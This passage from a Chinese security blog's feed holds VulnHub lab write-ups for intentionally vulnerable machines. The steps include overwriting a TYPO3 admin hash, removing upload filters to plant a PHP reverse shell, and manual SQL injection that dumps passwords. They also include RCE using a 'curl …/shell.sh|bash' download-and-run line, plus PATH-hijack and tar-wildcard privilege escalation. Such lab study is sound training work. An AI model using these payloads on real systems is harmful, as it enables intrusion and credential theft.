data-src=\"/N1h1l157/VULNHUB/image-675.png\" width=\"300\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启写入日志的开关：</span></span><br><span class=\"line\">SET GLOBAL general_log = &quot;ON&quot;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-676.png\" width=\"440\" alt=\"Image\">\n<p>查看设置是否正确，是否开启成功，检测到已经开启了日志写入，并且写入的地址在下面的文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-677.png\" width=\"310\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改默认的日志写入地址</span></span><br><span class=\"line\">SET GLOBAL general_log_file=“1.php”</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-678.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; phpmyadmin 拿 shell 失败，得采用其他的方式</p>\n<h3 id=\"覆盖admin密码\"><a class=\"markdownIt-Anchor\" href=\"#覆盖admin密码\">#</a> 覆盖 admin 密码</h3>\n<p>查看 sql 之后看到密码采用 argon 算法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-679.png\" width=\"650\" alt=\"Image\">\n<p>既然数据的密码采用的是 argon 的算法加密的，那么现在的思路就是通过 argon 算法生成一个加密后的密码并且替代原来的密码<br>\n在网站 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2FyZ29uMi1jZmZpLw==\">https://pypi.org/project/argon2-cffi/</span> 上看到了 argron2 的生成教程<br>\n通过 python 依次输入以下的命令可以将自定义的密码以 argon 加密</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-680.png\" width=\"650\" alt=\"Image\">\n<p>用 pip 来安装 argon： <code>python3 -m pip install argon2-cffi</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-681.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">打开python的命令行，依次输入以下命令</span></span><br><span class=\"line\">from argon2 import PasswordHasher</span><br><span class=\"line\">ph = PasswordHasher()</span><br><span class=\"line\">hash = ph.hash(&quot;typo&quot;)</span><br><span class=\"line\">print(hash)</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-682.png\" width=\"660\" alt=\"Image\">\n<p>打印出来的即为密码为 typo 的 argon 算法之后的加密字符:<br>\n <code>$argon2id$v=19$m=65536,t=3,p=4$BLSCVncgUy7tfYFMab+XMQ$LDy6bITURoFWRdb4JNHQ53e+t2TF9oiWeBdzLxHVoUM</code></p>\n<p>打开数据库中修改用户名密码的位置，将上述产生的 typo 加密后的字符替换原先的密码，点击确定即修改成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-683.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 现在就有了一个用户名密码分别为 admin:typo 的组合</p>\n<p>但是这个账户应该在哪个位置登陆还不确定，看起来像是一个网站后台的登陆地址；继续之前 80 端口的网站目录扫描，发现了一个 /typo3 的后台地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-684.png\" width=\"520\" alt=\"Image\">\n<p>（这里换了地方测试，重启了机器，重新分配了 ip 地址，靶机的 ip 地址发生了变化，正常的操作 ip 地址是不会发生变化的）<br>\n用 admin：typo 进入此后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-685.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 拿到了后台地址</p>\n<h3 id=\"修改过滤规则上传木马\"><a class=\"markdownIt-Anchor\" href=\"#修改过滤规则上传木马\">#</a> 修改过滤规则上传木马</h3>\n<p>进入后台之后看到是一个普通的后台管理地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-686.png\" width=\"700\" alt=\"Image\">\n<p>在 fileList 中找到了可以上传的位置，并且注明了上传文件的位置在 fileadmin 目录下，尝试从这个位置上传一个 php 后门</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-687.png\" width=\"700\" alt=\"Image\">\n<p>准备好 php 一句话木马，这里的 php 木马来源于 kali 机器上默认的木马，由于提前将此后门放在了公网 ip 上，就在自己的公网 ip 上直接拉下来即可，修改其主机和端口号为 kali 机器的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-688.png\" width=\"520\" alt=\"Image\">\n<p>点击上传文件，从本地选择 php 文件后，发现服务器拒绝了，说明有判断需要尝试绕过，可以用 00 截断的方式，这个地方尝试去寻找过滤文件的方式是否在后台能修改，进行绕过</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-689.png\" width=\"700\" alt=\"Image\">\n<p>在设置里边查找，看到了 Configure Installation-Wide Options 中有关于文件上传的格式限制，其正则表示如下：<br>\n <code>\\.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\\..*)?$|\\.pl$|^\\.htaccess$</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-690.png\" width=\"700\" alt=\"Image\">\n<p>将原有的过滤规则全部清除</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-691.png\" width=\"700\" alt=\"Image\">\n<p>确定之后，接下来文件上传将不会受到任何限制</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-692.png\" width=\"700\" alt=\"Image\">\n<p>再次尝试上传 shell.php 就上传成功了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-693.png\" width=\"700\" alt=\"Image\">\n<p>监听木马文件中的端口，同时去执行上传成功的木马，成功拿到网站权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-694.png\" width=\"520\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-695.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用一些命令将终端变为一个标准的shell</span></span><br><span class=\"line\">SHELL=/bin/bash script -q /dev/null</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-696.png\" width=\"420\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集信息</span></span><br><span class=\"line\">cat /etc/passwd | grep /bin/bash</span><br><span class=\"line\">cat /etc/passwd | grep www</span><br></pre></td></tr></table></figure>\n<p>判断出来没有其他的用户，需要直接拿到 root 的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-697.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看定时任务</span></span><br><span class=\"line\">cat /etc/crontab</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-698.png\" width=\"620\" alt=\"Image\">\n<p>发现没有任何任务被加载</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否有设置错误的s权限的文件</span></span><br><span class=\"line\">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-699.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; 找到一个 apache2-restart</p>\n<h3 id=\"文件权限设置错误提权\"><a class=\"markdownIt-Anchor\" href=\"#文件权限设置错误提权\">#</a> 文件权限设置错误提权</h3>\n<p>很显然这是一个自己封装的命令，需要进行读取或者反编译这个命令里边封装了哪些命令，通过 strings 将命令读取</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-700.png\" width=\"520\" alt=\"Image\">\n<p>是一个 service 的命令，意味着我们去执行 apache 2-restart 命令的时候，会去环境变量里边去找 service，而且去执行这个 service 的时候是以 root 权限执行的，</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过修改环境变量提权</span></span><br><span class=\"line\">echo &quot;/bin/bash&quot; &gt; /tmp/service</span><br><span class=\"line\">chmod +x /tmp/service</span><br><span class=\"line\">export PATH=/tmp/:$PATH</span><br><span class=\"line\">/usr/bin/local/apache2-restart</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-701.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/123%20KEYRING/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/123%20KEYRING/",
            "title": "VULNHUB 23 KEYRING",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEta2V5cmluZy0xMDEsNzE4Lw==\">https://www.vulnhub.com/entry/ia-keyring-101,718/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyMzcz\">https://blog.csdn.net/hljzzj/article/details/122952373</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 KEYRING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-524.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.127</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.208</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-525.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4\">http://192.168.31.208</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-526.png\" width=\"620\" alt=\"Image\">\n<p>是一个注册登陆的界面，直接输入 12345:12345 注册一个账户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-527.png\" width=\"650\" alt=\"Image\">\n<p>将注册的账户通过 login 界面登陆进去</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-528.png\" width=\"620\" alt=\"Image\">\n<p>登陆后的页面中 Home 是欢迎 12345 用户的信息，下面显示了时间</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-529.png\" width=\"520\" alt=\"Image\">\n<p>在 control 页面，显示的是一个 HPP 参数污染的提示</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-530.png\" width=\"520\" alt=\"Image\">\n<p>目前得到的信息并不能进行攻击，需要寻找更多的信息<br>\n对目标网址进行路径扫描，寻找更多的信息</p>\n<p><code>dirsearch -u http://192.168.31.208</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-531.png\" width=\"410\" alt=\"Image\">\n<p>dirsearch 并没有加载出来有利用价值的信息</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.208</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-532.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; gobuster 扫描出来了一个 history.php 的路径</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhw\">http://192.168.31.208/history.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-533.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"wfuzz-爆破参数\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-爆破参数\">#</a> wfuzz 爆破参数</h3>\n<p>提示说没有找到活跃的用户，猜测这里是因为没有登陆用户的原因<br>\n找到登陆页面，登陆我们之前注册的用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-534.png\" width=\"520\" alt=\"Image\">\n<p>重新打开 history.php 页面，提示信息变成了空白的，说明用户登陆对此页面的回显结果是有影响的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-535.png\" width=\"520\" alt=\"Image\">\n<p>很明显这个 history.php 的文件是存在问题的，怀疑后面是否有参数地址<br>\n可以用 wfuzz 进行爆破参数地址试试</p>\n<p><code>wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.31.208/history.php?FUZZ=xxx</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-536.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 发现全是 200 ，那就不能用 wfuzz 测试参数了，需要用其他的方式</p>\n<h3 id=\"模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#模糊测试\">#</a> 模糊测试</h3>\n<p>之前收集到的信息中有一句话 “can’t find this user’s activity”，尝试 user 参数<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=\"> http://192.168.31.208/history.php?user=admin</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-537.png\" width=\"380\" alt=\"Image\">\n<p>爆出来了源码 <span class=\"exturl\" data-url=\"aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n\">http://github.com/cyberbot75/keyring</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-538.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"手工sql注入\"><a class=\"markdownIt-Anchor\" href=\"#手工sql注入\">#</a> 手工 sql 注入</h3>\n<h4 id=\"判断是否是注入点\"><a class=\"markdownIt-Anchor\" href=\"#判断是否是注入点\">#</a> 判断是否是注入点</h4>\n<p>对 history.php 所在的 url 地址尝试手工判断是否是注入点<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjBhbmQlMjAxPTEtLSs=\"> http://192.168.31.208/history.php?user=admin' and 1=1--+</span></p>\n<p>and 1=1 --+ 被执行，and 1=2 --+ 报错，是注入点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-539.png\" width=\"520\" alt=\"Image\">\n<h4 id=\"猜字段数\"><a class=\"markdownIt-Anchor\" href=\"#猜字段数\">#</a> 猜字段数</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEtLSs=\">http://192.168.31.208/history.php?user=admin' union select 1--+</span></p>\n<p>猜字段有多少个，1 时是正确的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-540.png\" width=\"580\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMDEsMi0tKw==\">http://192.168.31.208/history.php?user=admin' union select 1,2--+</span></p>\n<p>1,2 时报错了，说明只能爆出来一个字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-541.png\" width=\"680\" alt=\"Image\">\n<h4 id=\"猜当前数据库\"><a class=\"markdownIt-Anchor\" href=\"#猜当前数据库\">#</a> 猜当前数据库</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4=\">http://192.168.31.208/history.php?user=admin</span>’ union select database()–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-542.png\" width=\"570\" alt=\"Image\">\n<p>数据库名是 users</p>\n<h4 id=\"猜数据库\"><a class=\"markdownIt-Anchor\" href=\"#猜数据库\">#</a> 猜数据库</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChzY2hlbWFfbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhLS0r\">http://192.168.31.208/history.php?user=admin' union select group_concat(schema_name) from information_schema.schemata--+</span></p>\n<p>group_concat(schema_name) from information_schema.schemata–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-543.png\" width=\"620\" alt=\"Image\">\n<p>一共有四个数据库 information_schema,mysql,performance_schema,sys,users</p>\n<h4 id=\"猜表\"><a class=\"markdownIt-Anchor\" href=\"#猜表\">#</a> 猜表</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSUyMGZyb20lMjBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzJTIwd2hlcmUlMjB0YWJsZV9zY2hlbQ==\">http://192.168.31.208/history.php?user=admin' union select group_concat(table_name) from information_schema.tables where table_schem</span><br>\na=%27users%27–+</p>\n<p>group_concat(table_name) from information_schema.tables where<br>\ntable_schema=‘users’–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-544.png\" width=\"520\" alt=\"Image\">\n<p>数据库 user 下有两个表：details,log</p>\n<h4 id=\"猜列\"><a class=\"markdownIt-Anchor\" href=\"#猜列\">#</a> 猜列</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMlMjB3aGVyZSUyMHRhYmxlX25hbWU9JTI3ZGV0YWlscyUyNy0tKw==\">http://192.168.31.208/history.php?user=admin' union select group_concat(column_name) from information_schema.columns where table_name='details'--+</span></p>\n<p>group_concat(column_name) from information_schema.columns where<br>\ntable_name=‘details’–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-545.png\" width=\"620\" alt=\"Image\">\n<p>users.detail 表中有两列：name，password</p>\n<h4 id=\"猜字段\"><a class=\"markdownIt-Anchor\" href=\"#猜字段\">#</a> 猜字段</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2Nv\">http://192.168.31.208/history.php?user=admin' union select group_co</span><br>\nncat(name)%20from%20users.details–+</p>\n<p>group_concat(name) from users.details–+admin,admin123,john,test</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-546.png\" width=\"470\" alt=\"Image\">\n<p>users.detail 中 name 分别是：admin,admin123,john,test</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChwYXNzd29yZCklMjBmcm9tJTIwdXNlcnMuZGV0YWlscy0tKw==\">http://192.168.31.208/history.php?user=admin' union select group_concat(password) from users.details--+</span></p>\n<p>group_concat(password) from users.details–+</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-547.png\" width=\"520\" alt=\"Image\">\n<p>users.detail 中 password 分别是：<br>\nmyadmin#p4szw0r4d,admin123,Sup3r<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mn>3</mn><mi>c</mi><mi>r</mi><mn>3</mn><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">S3cr3t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span></span></span></span>PasSW0RD,test</p>\n<p>去除掉自己注册掉的用户之外，发现源网站存在两个用户和密码</p>\n<p>-&gt; Admin: myadmin#p4szw0r4d john: Sup3r<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mn>3</mn><mi>c</mi><mi>r</mi><mn>3</mn><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">S3cr3t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span></span></span></span>PasSW0RD</p>\n<h3 id=\"php-代码审计\"><a class=\"markdownIt-Anchor\" href=\"#php-代码审计\">#</a> php 代码审计</h3>\n<p>由 Admin: myadmin#pszw0r4d 登陆到网站后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-548.png\" width=\"520\" alt=\"Image\">\n<p>home.php 页面检测到了 admin 账户已经登陆成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-549.png\" width=\"440\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n\">http://github.com/cyberbot75/keyring</span></p>\n<p>查看源码，审计源码，发现 control.php 存在 RCE 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-550.png\" width=\"700\" alt=\"Image\">\n<p>注入参数为 cmdcntr 测试是否回显成功</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9aWQ=\">http://192.168.31.208/control.php?cmdcntr=id</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-551.png\" width=\"620\" alt=\"Image\">\n<p>有回显，RCE 确实存在，测试是否存在相应的可反弹 shell 的命令</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9d2hpY2glMjBjdXJsO3doaWNoJTIwYmFzaDt3aGljaCUyMHB5dGhvbjt3aGljaCUyMHBocDs=\">http://192.168.31.208/control.php?cmdcntr=which curl;which bash;which python;which php;</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-552.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"后台反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#后台反弹shell\">#</a> 后台反弹 shell</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9Y3VybCUyMGh0dHA6Ly93d3cuY2hlbnR1by5hc2lhL3NoZWxsLnNoJTdDYmFzaA==\">http://192.168.31.208/control.php?cmdcntr=curl http://www.chentuo.asia/shell.sh|bash</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-553.png\" width=\"620\" alt=\"Image\">\n<p>接收 shell，并将其转变为一个标准的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-554.png\" width=\"520\" alt=\"Image\">\n<p>检查各个文件，查看有没有敏感的目录</p>\n<p>发现有一个 john 的用户，之前通过 sql 注入网站爆出的用户名有 john<br>\njohn: Sup3r<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mn>3</mn><mi>c</mi><mi>r</mi><mn>3</mn><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">S3cr3t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span></span></span></span>PasSW0RD 切换到了 john 用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-555.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"strings-查看文件\"><a class=\"markdownIt-Anchor\" href=\"#strings-查看文件\">#</a> strings 查看文件</h3>\n<p>翻阅相关的文件，找到了一个敏感的文件 s 权限的 compress<br>\n 但是服务器不存在 strings 不能查看这个命令里封装的是什么</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-556.png\" width=\"520\" alt=\"Image\">\n<p>通过 scp/wget 将文件下载到了 kali 主机上<br>\n strings compress 查看此命令的详细信息，compose 会调用 root 的 s 权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-557.png\" width=\"470\" alt=\"Image\">\n<h3 id=\"tar-通配符提权\"><a class=\"markdownIt-Anchor\" href=\"#tar-通配符提权\">#</a> tar 通配符提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">tar通配符提权</span></span><br><span class=\"line\">echo &quot;/bin/bash&quot; &gt; exp.sh</span><br><span class=\"line\">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh exp.sh&quot;</span><br><span class=\"line\">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class=\"line\">./compress</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-558.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"lxd-提权\"><a class=\"markdownIt-Anchor\" href=\"#lxd-提权\">#</a> lxd 提权</h3>\n<p>在 john 用户下，查看 id 时看到了所有组中有 lxd，并且本地有 lxc 命令</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-559.png\" width=\"420\" alt=\"Image\">\n<p>searchsploit lxd 查找到了本地是存在此 exp 的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-560.png\" width=\"500\" alt=\"Image\">\n<p>阅读利用脚本说明，需要在攻击机上下载并以 root 账户编译该文件，最后将编译成功的文件以及 exp 一块发送到目标机器上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-561.png\" width=\"520\" alt=\"Image\">\n<p>在攻击机上下载 payload<br>\n <code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-562.png\" width=\"550\" alt=\"Image\">\n<p>在攻击机上编译此 payload<br>\n 运行此命令时因为 kali 机器是在 M1 的 mac 电脑上搭建的，属于 aarch，不同于 windows 的 amd64 系统，因此编译失败了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-563.png\" width=\"470\" alt=\"Image\">\n<p>-&gt; Lxd 提权失败了，需要一台 amd64 的机器进行编译此文件</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/",
            "title": "VULNHUB 24 HACKABLELL",
            "date_published": "2021-10-31T16:00:00.000Z",
